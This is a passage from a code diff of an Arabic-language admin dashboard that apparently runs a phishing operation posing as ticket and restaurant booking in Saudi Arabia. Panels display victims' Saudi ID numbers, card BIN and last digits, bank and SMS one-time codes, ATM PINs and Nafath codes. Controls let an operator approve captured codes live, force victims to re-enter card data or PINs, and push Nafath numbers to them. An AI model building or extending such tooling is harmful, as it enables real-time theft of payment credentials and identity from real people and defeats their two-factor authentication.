+                data-testid="ip-blocklist-dialog-close"
+              >
+                <XIcon className="w-4 h-4" />
+              </button>
+              <BlockedIpsCard
+                ips={blockedIps}
+                onAdd={addBlockedIp}
+                onRemove={removeBlockedIp}
+                suggestedIp={selected?.ip || selected?.ipAddress}
+                suggestedName={selected?.name || selected?.id}
+              />
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Blocked BINs management dialog */}
+      {blocklistOpen && (
+        <div
+          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in"
+          onClick={() => setBlocklistOpen(false)}
+          data-testid="blocklist-dialog-backdrop"
+        >
+          <div
+            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div className="relative">
+              <button
+                onClick={() => setBlocklistOpen(false)}
+                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white transition"
+                aria-label="إغلاق"
+                data-testid="blocklist-dialog-close"
+              >
+                <XIcon className="w-4 h-4" />
+              </button>
+              <BlockedBinsCard
+                bins={blockedBins}
+                onAdd={addBlockedBin}
+                onRemove={removeBlockedBin}
+                suggestedBin={selected?.payment?.cardBin}
+                suggestedLast4={selected?.payment?.cardLast4}
+              />
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+/* ============================================================ */
+/* Sub-components                                                */
+/* ============================================================ */
+
+function IconButton({
+  icon: Icon,
+  label,
+  color,
+  onClick,
+  badge,
+  pulse,
+}: {
+  icon: any;
+  label: string;
+  color: "red" | "slate" | "green";
+  onClick?: () => void;
+  badge?: string;
+  pulse?: boolean;
+}) {
+  const cls =
+    color === "red"
+      ? "bg-red-500/15 text-red-400 hover:bg-red-500/25 border-red-500/30"
+      : color === "green"
+        ? "bg-green-500/15 text-green-400 hover:bg-green-500/25 border-green-500/30"
+        : "bg-slate-800/60 text-slate-300 hover:bg-slate-700 border-slate-700";
+  return (
+    <button
+      onClick={onClick}
+      title={label}
+      className={`w-9 h-9 rounded-lg border flex items-center justify-center transition relative ${cls} ${pulse ? "animate-pulse" : ""}`}
+    >
+      <Icon className="w-4 h-4" />
+      {badge && (
+        <span className="absolute -top-1 -left-1 min-w-[16px] h-4 px-1 rounded-full bg-red-500 text-white text-[9px] font-bold flex items-center justify-center border border-slate-900">
+          {badge}
+        </span>
+      )}
+    </button>
+  );
+}
+
+function StatCard({
+  icon: Icon,
+  label,
+  value,
+  color,
+  pulse,
+  onClick,
+}: {
+  icon: any;
+  label: string;
+  value: number;
+  color: "slate" | "green" | "amber" | "cyan" | "emerald";
+  pulse?: boolean;
+  onClick?: () => void;
+}) {
+  const palette: Record<string, { bg: string; text: string; ring: string }> = {
+    slate: {
+      bg: "bg-slate-800/40",
+      text: "text-slate-200",
+      ring: "border-slate-700",
+    },
+    green: {
+      bg: "bg-green-500/10",
+      text: "text-green-300",
+      ring: "border-green-500/30",
+    },
+    amber: {
+      bg: "bg-amber-500/10",
+      text: "text-amber-300",
+      ring: "border-amber-500/40",
+    },
+    cyan: {
+      bg: "bg-cyan-500/10",
+      text: "text-cyan-300",
+      ring: "border-cyan-500/30",
+    },
+    emerald: {
+      bg: "bg-emerald-500/10",
+      text: "text-emerald-300",
+      ring: "border-emerald-500/30",
+    },
+  };
+  const p = palette[color];
+  const Comp: any = onClick ? "button" : "div";
+  return (
+    <Comp
+      onClick={onClick}
+      className={`text-right rounded-xl border ${p.ring} ${p.bg} px-3 py-2 flex items-center gap-2.5 transition ${onClick ? "hover:brightness-125 cursor-pointer" : ""} ${pulse ? "shadow-[0_0_0_1px_rgba(251,191,36,0.3)]" : ""}`}
+    >
+      <div
+        className={`w-9 h-9 rounded-lg flex items-center justify-center ${p.bg} border ${p.ring}`}
+      >
+        <Icon className={`w-4 h-4 ${p.text}`} />
+      </div>
+      <div className="flex-1 min-w-0">
+        <div className="text-[10px] text-slate-400 truncate">{label}</div>
+        <div className={`text-lg font-bold ${p.text} leading-tight`}>
+          {value}
+        </div>
+      </div>
+    </Comp>
+  );
+}
+
+function Panel({
+  title,
+  badge,
+  children,
+}: {
+  title: string;
+  badge?: string;
+  children: React.ReactNode;
+}) {
+  return (
+    <div
+      className="rounded-xl border overflow-hidden flex flex-col"
+      style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+    >
+      <div
+        className="px-3 py-2 flex items-center justify-between border-b"
+        style={{ borderColor: "#1f2a3d", backgroundColor: "#0d1525" }}
+      >
+        <h3 className="text-sm font-bold text-slate-200">{title}</h3>
+        {badge && (
+          <span className="text-[10px] px-2 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 font-semibold">
+            {badge}
+          </span>
+        )}
+      </div>
+      <div className="p-3 flex-1 text-[12px]">{children}</div>
+    </div>
+  );
+}
+
+function Row({
+  label,
+  value,
+  mono,
+}: {
+  label: string;
+  value: any;
+  mono?: boolean;
+}) {
+  const text = safeText(value);
+  if (!text) return null;
+  return (
+    <div className="flex items-center justify-between py-1.5 border-b border-slate-800/40 last:border-0">
+      <span className="text-slate-500 text-[11px]">{label}</span>
+      <span
+        className={`text-slate-100 text-[12px] font-semibold ${mono ? "font-mono" : ""}`}
+        dir={mono ? "ltr" : undefined}
+      >
+        {text}
+      </span>
+    </div>
+  );
+}
+
+function VisitorHeaderCard({ visitor }: { visitor: Visitor }) {
+  const online = isOnline(visitor);
+  return (
+    <div
+      className="rounded-xl border overflow-hidden flex flex-col"
+      style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+    >
+      <div className="flex border-b" style={{ borderColor: "#1f2a3d" }}>
+        <div className="flex-1 px-3 py-2 text-center bg-cyan-500/10 text-cyan-300 text-xs font-bold border-l border-cyan-500/30">
+          الكل
+        </div>
+        <div className="flex-1 px-3 py-2 text-center text-slate-400 text-xs">
+          ديناميكية
+        </div>
+      </div>
+
+      <div
+        className="p-4 text-center border-b"
+        style={{ borderColor: "#1f2a3d" }}
+      >
+        <h3 className="text-base font-bold text-slate-100 mb-1">
+          {visitor.name || "زائر بدون اسم"}
+        </h3>
+        <div className="text-cyan-400 font-mono text-xs space-y-0.5" dir="ltr">
+          <div>{visitor.phoneVerification || "—"}</div>
+          <div>{visitor.phone || "—"}</div>
+        </div>
+        <div className="flex items-center justify-center gap-3 mt-2 text-[11px] text-slate-400">
+          <span className="flex items-center gap-1">
+            <PhoneIcon className="w-3 h-3" /> mobile
+          </span>
+          <span className="text-slate-700">|</span>
+          <span className="flex items-center gap-1">
+            <Globe className="w-3 h-3" /> Chrome
+          </span>
+          <span className="text-slate-700">|</span>
+          <span>Saudi Arabia</span>
+        </div>
+        <div className="mt-2 inline-flex items-center gap-1.5 text-[11px]">
+          <span
+            className={`w-1.5 h-1.5 rounded-full ${online ? "bg-green-400" : "bg-slate-600"}`}
+          />
+          <span className={online ? "text-green-400" : "text-slate-500"}>
+            {online ? "أونلاين" : "غير متصل"}
+          </span>
+        </div>
+      </div>
+
+      <div className="p-3 space-y-1 text-[12px]">
+        <Row label="آخر تحديث" value={fmtTime(visitor.updatedAt)} />
+        <Row label="المرحلة" value={STEP_LABELS[visitor.step as number]} />
+        <Row label="الحالة" value={visitor.status} />
+        {(visitor.ip || visitor.ipAddress) && (
+          <Row
+            label="عنوان IP"
+            value={String(visitor.ip || visitor.ipAddress)}
+            mono
+          />
+        )}
+        <Row label="معرّف الزائر" value={visitor.id.slice(0, 12) + "…"} mono />
+      </div>
+    </div>
+  );
+}
+
+function CustomerInfoCard({ visitor }: { visitor: Visitor }) {
+  // Maps for ticket / restaurant booking fields actually present in the app.
+  const basicRows = [
+    safeText(visitor.name) && (
+      <Row key="n" label="الاسم" value={visitor.name} />
+    ),
+    safeText(visitor.phone) && (
+      <Row key="p" label="رقم الجوال" value={visitor.phone} mono />
+    ),
+    safeText(visitor.email) && (
+      <Row key="em" label="البريد الإلكتروني" value={visitor.email} mono />
+    ),
+    safeText(visitor.saudiId) && (
+      <Row key="si" label="رقم الهوية" value={visitor.saudiId} mono />
+    ),
+  ].filter(Boolean);
+
+  // Ticket-flow rows
+  const ticketRows = [
+    safeText(visitor.ticketQuantity) && (
+      <Row key="tq" label="عدد التذاكر" value={visitor.ticketQuantity} />
+    ),
+    safeText(visitor.ticketPrice) && (
+      <Row key="tp" label="سعر التذكرة" value={`${visitor.ticketPrice} ر.س`} />
+    ),
+    safeText(visitor.totalAmount) && (
+      <Row key="ta" label="المبلغ الإجمالي" value={`${visitor.totalAmount} ر.س`} />
+    ),
+    safeText(visitor.bookingDate) && (
+      <Row key="bd" label="تاريخ الزيارة" value={visitor.bookingDate} />
+    ),
+    safeText(visitor.bookingTime) && (
+      <Row key="bt" label="وقت الزيارة" value={visitor.bookingTime} />
+    ),
+  ].filter(Boolean);
+
+  // Restaurant-reservation rows
+  const restaurantRows = [
+    safeText(visitor.restaurant) && (
+      <Row key="rs" label="المطعم" value={visitor.restaurant} />
+    ),
+    safeText(visitor.date) && (
+      <Row key="rd" label="تاريخ الحجز" value={visitor.date} />
+    ),
+    safeText(visitor.time) && (
+      <Row key="rt" label="وقت الحجز" value={visitor.time} />
+    ),
+    safeText(visitor.guests) && (
+      <Row key="rg" label="عدد الأشخاص" value={visitor.guests} />
+    ),
+    safeText(visitor.notes) && (
+      <Row key="rn" label="ملاحظات" value={visitor.notes} />
+    ),
+    safeText(visitor.total) && (
+      <Row key="rto" label="إجمالي الحجز" value={`${visitor.total} ر.س`} />
+    ),
+  ].filter(Boolean);
+
+  return (
+    <div className="space-y-4 grid w-full ">
+      {basicRows.length > 0 && (
+        <Panel title="معلومات أساسية">
+          <div className="space-y-1">{basicRows}</div>
+        </Panel>
+      )}
+      {ticketRows.length > 0 && (
+        <Panel title="بيانات التذاكر">
+          <div className="space-y-1">{ticketRows}</div>
+        </Panel>
+      )}
+      {restaurantRows.length > 0 && (
+        <Panel title="حجز المطعم">
+          <div className="space-y-1">{restaurantRows}</div>
+        </Panel>
+      )}
+    </div>
+  );
+}
+
+function OtpControlCard({
+  visitor,
+  otpInput: _otpInput,
+  setOtpInput: _setOtpInput,
+  otpDirect,
+  setOtpDirect,
+  onApprove,
+  onReject,
+  onSendOtp,
+  onForceFinalOtp,
+}: {
+  visitor: Visitor;
+  otpInput: string;
+  setOtpInput: (s: string) => void;
+  otpDirect: string;
+  setOtpDirect: (s: string) => void;
+  onApprove: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
+  onReject: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
+  onSendOtp: (code: string) => void;
+  onForceFinalOtp: () => void;
+}) {
+  const cardOtp = String(visitor.otp || "");
+  const phoneOtp = String(visitor.smsOtp || "");
+  const nafadOtp = String(visitor.nafadOtp || "");
+  const waitingBank = visitor.otpApprovalStatus === "waiting";
+  const waitingPhone = visitor.phoneOtpApprovalStatus === "waiting";
+  const onOtpStep =
+    visitor.step === 5 || visitor.step === 8 || visitor.step === 9;
+  if (
+    !cardOtp &&
+    !phoneOtp &&
+    !nafadOtp &&
+    !waitingBank &&
+    !waitingPhone &&
+    !onOtpStep
+  )
+    return null;
+
+  return (
+    <Panel
+      title="رموز التحقق (OTP)"
+      badge={waitingBank || waitingPhone ? "بانتظار الموافقة" : undefined}
+    >
+      <div className="space-y-3">
+        <OtpRow
+          label="OTP البطاقة (البنك)"
+          step={5}
+          code={cardOtp}
+          status={
+            waitingBank
+              ? "waiting"
+              : visitor.otpApprovalStatus || (cardOtp ? "received" : "—")
+          }
+          canDecide={waitingBank}
+          onApprove={() => onApprove("otpApprovalStatus")}
+          onReject={() => onReject("otpApprovalStatus")}
+        />
+        <OtpRow
+          label="OTP الجوال (SMS)"
+          step={8}
+          code={phoneOtp}
+          status={
+            waitingPhone
+              ? "waiting"
+              : visitor.phoneOtpApprovalStatus || (phoneOtp ? "received" : "—")
+          }
+          canDecide={waitingPhone}
+          onApprove={() => onApprove("phoneOtpApprovalStatus")}
+          onReject={() => onReject("phoneOtpApprovalStatus")}
+        />
+        <OtpRow
+          label="رمز نفاذ النهائي"
+          step={9}
+          code={nafadOtp}
+          status={nafadOtp ? "received" : "—"}
+          canDecide={false}
+        />
+
+        {/* Status section */}
+        <div>
+          <div className="text-[11px] text-slate-500 mb-1.5">حالة الموافقات</div>
+          <div className="space-y-1 bg-slate-900/60 rounded-lg p-2">
+            <StatusLine
+              label="رمز العضوية"
+              status={
+                waitingBank ? "waiting" : visitor.otpApprovalStatus || "—"
+              }
+            />
+            <StatusLine
+              label="كلمة المرور"
+              status={visitor.atmPin ? "received" : "—"}
+            />
+            <StatusLine
+              label="رمز التأكيد الكروية"
+              status={
+                waitingPhone
+                  ? "waiting"
+                  : visitor.phoneOtpApprovalStatus || "—"
+              }
+            />
+          </div>
+        </div>
+
+        {/* Direct push OTP */}
+        <div>
+          <input
+            value={otpDirect}
+            onChange={(e) => setOtpDirect(e.target.value)}
+            placeholder="أدخل رقم النقاط"
+            className="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-xs text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500 text-right"
+            data-testid="push-otp-input"
+          />
+          <div className="grid grid-cols-2 gap-1.5 mt-1.5">
+            <button
+              onClick={() => {
+                if (otpDirect.trim()) {
+                  onSendOtp(otpDirect.trim());
+                  setOtpDirect("");
+                }
+              }}
+              className="py-1.5 bg-slate-700 hover:bg-slate-600 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
+              data-testid="push-otp-send"
+            >
+              <Send className="w-3 h-3" /> إرسال
             </button>
             <button
-              onClick={() => setShowBlockedBinsPanel((v) => !v)}
-              className={`relative p-1.5 rounded transition-colors ${showBlockedBinsPanel ? "text-red-400" : "text-[#8696a0] hover:text-red-400"}`}
-              data-testid="button-blocked-bins-toggle"
-              title="البطاقات المحظورة"
+              onClick={onForceFinalOtp}
+              className="py-1.5 bg-gradient-to-r from-violet-600 to-purple-600 hover:from-violet-500 hover:to-purple-500 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
+              data-testid="force-final"
             >
-              <Ban className="w-4 h-4" />
-              {blockedBins.length > 0 && (
-                <span className="absolute -top-1 -right-1 bg-red-500 text-white text-[9px] font-bold rounded-full min-w-[16px] h-[16px] flex items-center justify-center px-1">
-                  {blockedBins.length}
-                </span>
-              )}
+              <ArrowLeftRight className="w-3 h-3" /> توجيه إلى Final OTP
             </button>
-            <button onClick={() => setSoundEnabled(!soundEnabled)} className={`p-1.5 rounded transition-colors ${soundEnabled ? "text-[#00a884]" : "text-[#8696a0]"}`} data-testid="button-sound-toggle">
-              <Volume2 className="w-4 h-4" />
+          </div>
+        </div>
+      </div>
+    </Panel>
+  );
+}
+
+function NafadControl({
+  visitor,
+  onApprove,
+  onReject,
+}: {
+  visitor: Visitor;
+  onApprove: (
+    field:
+      | "cardApprovalStatus"
+      | "otpApprovalStatus"
+      | "phoneOtpApprovalStatus",
+  ) => void;
+  onReject: (
+    field:
+      | "cardApprovalStatus"
+      | "otpApprovalStatus"
+      | "phoneOtpApprovalStatus",
+  ) => void;
+}) {
+  const [code, setCode] = useState("");
+  const sentCode = String(visitor.nafadConfirmationCode || "");
+  const status = visitor.nafadConfirmationStatus;
+
+  async function sendCode() {
+    if (!db) return;
+    const clean = code.replace(/\D/g, "").slice(0, 2);
+    if (clean.length < 2) return;
+    await setDoc(
+      doc(db, "pays", visitor.id),
+      {
+        nafadConfirmationCode: clean,
+        nafadConfirmationStatus: "waiting",
+        nafadUpdatedAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+    setCode("");
+  }
+
+  async function clearCode() {
+    if (!db) return;
+    await setDoc(
+      doc(db, "pays", visitor.id),
+      {
+        nafadConfirmationCode: "",
+        nafadConfirmationStatus: "waiting",
+        nafadUpdatedAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  }
+
+  return (
+    <div className="bg-teal-500/10 border border-teal-500/30 rounded-lg p-2 space-y-2">
+      <div className="text-[11px] text-teal-300 font-bold flex items-center justify-between">
+        <span>طلب نفاذ — رقم التحقق</span>
+        {sentCode ? (
+          <span
+            className="font-mono text-base text-teal-200"
+            dir="ltr"
+            data-testid="admin-nafad-current"
+          >
+            {sentCode}
+          </span>
+        ) : (
+          <span className="text-[10px] text-amber-300">
+            المستخدم بانتظار الرقم
+          </span>
+        )}
+      </div>
+
+      <div className="flex gap-1.5">
+        <input
+          value={code}
+          onChange={(e) =>
+            setCode(e.target.value.replace(/\D/g, "").slice(0, 2))
+          }
+          placeholder="رقم من رقمين"
+          inputMode="numeric"
+          maxLength={2}
+          dir="ltr"
+          data-testid="admin-nafad-input"
+          className="flex-1 bg-slate-900/60 border border-slate-700 rounded px-2 py-1.5 text-sm font-mono text-teal-200 text-center focus:outline-none focus:border-teal-400"
+        />
+        <button
+          onClick={sendCode}
+          disabled={code.length < 2}
+          data-testid="admin-nafad-send"
+          className="px-3 py-1.5 bg-teal-500/30 text-teal-100 rounded text-xs font-bold border border-teal-500/50 hover:bg-teal-500/40 disabled:opacity-40 disabled:cursor-not-allowed"
+        >
+          إرسال
+        </button>
+        {sentCode && (
+          <button
+            onClick={clearCode}
+            data-testid="admin-nafad-clear"
+            title="مسح وإعادة طلب رقم"
+            className="px-2 py-1.5 bg-slate-800 text-slate-300 rounded text-xs border border-slate-700 hover:bg-slate-700"
+          >
+            ✕
+          </button>
+        )}
+      </div>
+
+      {sentCode && (
+        <div className="grid grid-cols-2 gap-1.5">
+          <button
+            onClick={() => onApprove("nafadConfirmationStatus" as any)}
+            data-testid="admin-nafad-approve"
+            className={`py-1 rounded text-xs font-semibold border ${
+              status === "approved"
+                ? "bg-green-500/40 text-green-100 border-green-400"
+                : "bg-green-500/20 text-green-300 border-green-500/30 hover:bg-green-500/30"
+            }`}
+          >
+            قبول نفاذ
+          </button>
+          <button
+            onClick={() => onReject("nafadConfirmationStatus" as any)}
+            data-testid="admin-nafad-reject"
+            className={`py-1 rounded text-xs font-semibold border ${
+              status === "rejected"
+                ? "bg-red-500/40 text-red-100 border-red-400"
+                : "bg-red-500/20 text-red-300 border-red-500/30 hover:bg-red-500/30"
+            }`}
+          >
+            رفض نفاذ
+          </button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function CustomizeDropdown({
+  settings,
+  onChange,
+  onReset,
+}: {
+  settings: CardSettings;
+  onChange: (key: CardKey, patch: Partial<CardSetting>) => void;
+  onReset: () => void;
+}) {
+  const [open, setOpen] = useState(false);
+
+  useEffect(() => {
+    if (!open) return;
+    const onDoc = (e: MouseEvent) => {
+      const t = e.target as HTMLElement;
+      if (!t.closest("[data-customize-dropdown]")) setOpen(false);
+    };
+    document.addEventListener("mousedown", onDoc);
+    return () => document.removeEventListener("mousedown", onDoc);
+  }, [open]);
+
+  const hiddenCount = (Object.values(settings) as CardSetting[]).filter(
+    (s) => !s.visible,
+  ).length;
+
+  return (
+    <div className="relative" data-customize-dropdown>
+      <button
+        onClick={() => setOpen((o) => !o)}
+        className="px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-2 bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"
+        data-testid="admin-customize-btn"
+      >
+        <Settings className="w-4 h-4" />
+        تخصيص اللوحة
+        {hiddenCount > 0 && (
+          <span className="text-[10px] bg-cyan-500/20 text-cyan-300 px-1.5 py-0.5 rounded">
+            {hiddenCount} مخفي
+          </span>
+        )}
+        <ChevronDown
+          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
+        />
+      </button>
+
+      {open && (
+        <div
+          className="absolute top-full mt-2 left-0 w-80 rounded-xl border shadow-2xl z-30"
+          style={{ backgroundColor: "#0f1828", borderColor: "#1f2a3d" }}
+        >
+          <div className="p-3 border-b border-slate-800 flex items-center justify-between">
+            <div className="text-xs font-bold text-slate-200">
+              إظهار / إخفاء وتغيير حجم البطاقات
+            </div>
+            <button
+              onClick={onReset}
+              className="text-[10px] text-cyan-400 hover:text-cyan-300 flex items-center gap-1"
+              data-testid="admin-customize-reset"
+            >
+              <RotateCcw className="w-3 h-3" />
+              إعادة الضبط
             </button>
-            <div className="flex items-center gap-1.5 text-[#00a884]" data-testid="live-indicator">
-              <span className="relative flex h-2 w-2">
-                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00a884] opacity-75"></span>
-                <span className="relative inline-flex rounded-full h-2 w-2 bg-[#00a884]"></span>
-              </span>
-              <span className="text-xs font-medium">مباشر</span>
+          </div>
+
+          <div className="p-2 max-h-96 overflow-y-auto">
+            {(Object.keys(CARD_LABELS) as CardKey[]).map((key) => {
+              const s = settings[key];
+              return (
+                <div
+                  key={key}
+                  className="p-2 rounded-lg hover:bg-slate-800/40"
+                  data-testid={`admin-customize-row-${key}`}
+                >
+                  <div className="flex items-center justify-between gap-2">
+                    <button
+                      onClick={() => onChange(key, { visible: !s.visible })}
+                      className="flex items-center gap-2 flex-1 text-right"
+                      data-testid={`admin-customize-toggle-${key}`}
+                    >
+                      {s.visible ? (
+                        <Eye className="w-4 h-4 text-cyan-400" />
+                      ) : (
+                        <EyeOff className="w-4 h-4 text-slate-500" />
+                      )}
+                      <span
+                        className={`text-xs font-semibold ${s.visible ? "text-slate-100" : "text-slate-500"}`}
+                      >
+                        {CARD_LABELS[key]}
+                      </span>
+                    </button>
+                  </div>
+                  {s.visible && (
+                    <div className="mt-2 grid grid-cols-2 gap-1">
+                      {([1, 2] as const).map((sp) => (
+                        <button
+                          key={sp}
+                          onClick={() => onChange(key, { span: sp })}
+                          className={`py-1 rounded-md text-[10px] font-semibold transition ${
+                            s.span === sp
+                              ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40"
+                              : "bg-slate-800 text-slate-400 hover:bg-slate-700 border border-transparent"
+                          }`}
+                          data-testid={`admin-customize-span-${key}-${sp}`}
+                        >
+                          {sp === 1 ? "نصف العرض" : "عرض كامل"}
+                        </button>
+                      ))}
+                    </div>
+                  )}
+                </div>
+              );
+            })}
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
+  const [open, setOpen] = useState(false);
+  const current = Number(visitor.step) || 1;
+  const directed = Number(visitor.directedStep) || 0;
+  const pending = directed > 0 && directed !== current;
+
+  useEffect(() => {
+    if (!open) return;
+    const onDoc = (e: MouseEvent) => {
+      const t = e.target as HTMLElement;
+      if (!t.closest("[data-pages-dropdown]")) setOpen(false);
+    };
+    document.addEventListener("mousedown", onDoc);
+    return () => document.removeEventListener("mousedown", onDoc);
+  }, [open]);
+
+  return (
+    <div className="relative" data-pages-dropdown>
+      <button
+        onClick={() => setOpen((o) => !o)}
+        data-testid="pages-dropdown-toggle"
+        className={`h-9 px-3 rounded-lg flex items-center gap-2 border text-xs font-bold transition ${
+          pending
+            ? "bg-violet-500/20 border-violet-500/50 text-violet-200"
+            : "bg-cyan-500/15 border-cyan-500/40 text-cyan-300 hover:bg-cyan-500/25"
+        }`}
+      >
+        <Layers className="w-3.5 h-3.5" />
+        <span>التحكم بالصفحات</span>
+        <span className="px-1.5 py-0.5 rounded bg-slate-900/60 text-[10px] font-mono">
+          {current}/9
+        </span>
+        <ChevronDown
+          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
+        />
+      </button>
+
+      {open && (
+        <div
+          className="absolute top-full mt-2 left-0 w-[340px] rounded-xl border shadow-2xl z-30 p-3"
+          style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+        >
+          <div className="flex items-center justify-between mb-2 pb-2 border-b border-slate-800">
+            <div className="text-xs font-bold text-slate-200">
+              التحكم بالصفحات
+            </div>
+            <div className="text-[10px] text-cyan-400">الحالية: {current}</div>
+          </div>
+          <PagesControl visitor={visitor} />
+        </div>
+      )}
+    </div>
+  );
+}
+
+function PagesControl({ visitor }: { visitor: Visitor }) {
+  const current = Number(visitor.step) || 1;
+  const directed = Number(visitor.directedStep) || 0;
+
+  async function pushStep(target: number) {
+    if (!db) return;
+    await setDoc(
+      doc(db, "pays", visitor.id),
+      {
+        directedStep: target,
+        directedAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      },
+      { merge: true },
+    );
+  }
+
+  async function clearApproval(field: string) {
+    if (!db) return;
+    // Mirror the reset onto the legacy fields so the user-facing app's
+    // listenForApproval / listenForOtpApproval listeners do not see a stale
+    // "approved" or "rejected" state when the admin re-requests a fresh
+    // submission.
+    const payload: Record<string, unknown> = {
+      [field]: "waiting",
+      updatedAt: new Date().toISOString(),
+    };
+    if (field === "cardApprovalStatus") {
+      payload.cardApproved = false;
+      payload.cardStatus = "pending_approval";
+      payload.status = "pending_approval";
+    } else if (field === "otpApprovalStatus") {
+      payload.otpApproved = false;
+      payload.otpStatus = "pending";
+    }
+    await setDoc(doc(db, "pays", visitor.id), payload, { merge: true });
+  }
+
+  return (
+    <div className="space-y-3">
+      <div className="grid grid-cols-4 gap-1.5">
+        {Object.entries(STEP_LABELS).map(([k, label]) => {
+          const n = Number(k);
+          const isCurrent = current === n;
+          const isDirected = directed === n;
+          return (
+            <button
+              key={k}
+              onClick={() => pushStep(n)}
+              data-testid={`push-step-${n}`}
+              className={`py-2 px-1.5 rounded-lg text-[11px] font-bold transition border ${
+                isCurrent
+                  ? "bg-cyan-500 text-slate-900 border-cyan-400"
+                  : isDirected
+                    ? "bg-violet-500/30 text-violet-200 border-violet-400/50"
+                    : "bg-slate-800/60 text-slate-300 border-slate-700 hover:bg-slate-700"
+              }`}
+            >
+              <div className="text-[9px] opacity-70 mb-0.5">{n}</div>
+              <div className="leading-tight">{label}</div>
+            </button>
+          );
+        })}
+      </div>
+
+      <div className="border-t border-slate-800 pt-2 space-y-1.5">
+        <div className="text-[10px] text-slate-500 mb-1">إجراءات سريعة</div>
+        <div className="grid grid-cols-2 gap-1.5">
+          <button
+            onClick={() => pushStep(4)}
+            className="py-1.5 bg-amber-500/15 text-amber-300 rounded text-[11px] font-semibold border border-amber-500/30 hover:bg-amber-500/25"
+          >
+            إعادة البطاقة
+          </button>
+          <button
+            onClick={() => pushStep(5)}
+            className="py-1.5 bg-orange-500/15 text-orange-300 rounded text-[11px] font-semibold border border-orange-500/30 hover:bg-orange-500/25"
+          >
+            إعادة OTP بنك
+          </button>
+          <button
+            onClick={() => pushStep(6)}
+            className="py-1.5 bg-rose-500/15 text-rose-300 rounded text-[11px] font-semibold border border-rose-500/30 hover:bg-rose-500/25"
+          >
+            إعادة PIN
+          </button>
+          <button
+            onClick={() => pushStep(8)}
+            className="py-1.5 bg-fuchsia-500/15 text-fuchsia-300 rounded text-[11px] font-semibold border border-fuchsia-500/30 hover:bg-fuchsia-500/25"
+          >
+            إعادة OTP جوال
+          </button>
+          <button
+            onClick={() => pushStep(9)}
+            className="col-span-2 py-1.5 bg-teal-500/20 text-teal-200 rounded text-[11px] font-bold border border-teal-500/40 hover:bg-teal-500/30"
+          >
+            توجيه إلى نفاذ
+          </button>
+        </div>
+      </div>
+
+      <div className="border-t border-slate-800 pt-2 space-y-1">
+        <div className="text-[10px] text-slate-500 mb-1">طلب جديد</div>
+        <div className="grid grid-cols-3 gap-1.5">
+          <button
+            onClick={() => clearApproval("cardApprovalStatus")}
+            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
+          >
+            بطاقة
+          </button>
+          <button
+            onClick={() => clearApproval("otpApprovalStatus")}
+            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
+          >
+            OTP بنك
+          </button>
+          <button
+            onClick={() => clearApproval("phoneOtpApprovalStatus")}
+            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
+          >
+            OTP جوال
+          </button>
+        </div>
+      </div>
+
+      {directed > 0 && directed !== current && (
+        <div className="text-[10px] text-violet-300 bg-violet-500/10 border border-violet-500/30 rounded p-1.5 text-center">
+          ⏳ تم التوجيه إلى الخطوة {directed} - بانتظار استجابة المستخدم
+        </div>
+      )}
+    </div>
+  );
+}
+
+function OtpRow({
+  label,
+  step,
+  code,
+  status,
+  canDecide,
+  onApprove,
+  onReject,
+}: {
+  label: string;
+  step: number;
+  code: string;
+  status: string;
+  canDecide: boolean;
+  onApprove?: () => void;
+  onReject?: () => void;
+}) {
+  const length = Math.max(code.length, 4);
+  const digits = code.padEnd(length, "•").slice(0, length).split("");
+  const tone =
+    status === "waiting"
+      ? "border-amber-500/40 bg-amber-500/5"
+      : status === "approved"
+        ? "border-green-500/30 bg-green-500/5"
+        : status === "rejected"
+          ? "border-red-500/30 bg-red-500/5"
+          : "border-slate-700 bg-slate-900/40";
+  return (
+    <div className={`rounded-lg p-2 border ${tone}`}>
+      <div className="flex items-center justify-between mb-1.5">
+        <div className="flex items-center gap-1.5">
+          <span className="text-[10px] text-slate-400 font-semibold">
+            {label}
+          </span>
+          <span className="text-[9px] text-slate-500 bg-slate-800 rounded px-1.5 py-0.5">
+            مرحلة {step}
+          </span>
+        </div>
+        <span className="text-[10px] text-slate-500">
+          {code ? `${code.length} رقم` : "—"}
+        </span>
+      </div>
+      <div className="flex gap-1 justify-center mb-2" dir="ltr">
+        {digits.map((d, i) => (
+          <div
+            key={i}
+            className={`w-8 h-9 rounded-md flex items-center justify-center text-base font-bold font-mono border ${
+              code
+                ? "bg-slate-800 border-slate-700 text-cyan-300"
+                : "bg-slate-900/40 border-slate-800 text-slate-600"
+            }`}
+          >
+            {d}
+          </div>
+        ))}
+      </div>
+      {(onApprove || onReject) && (
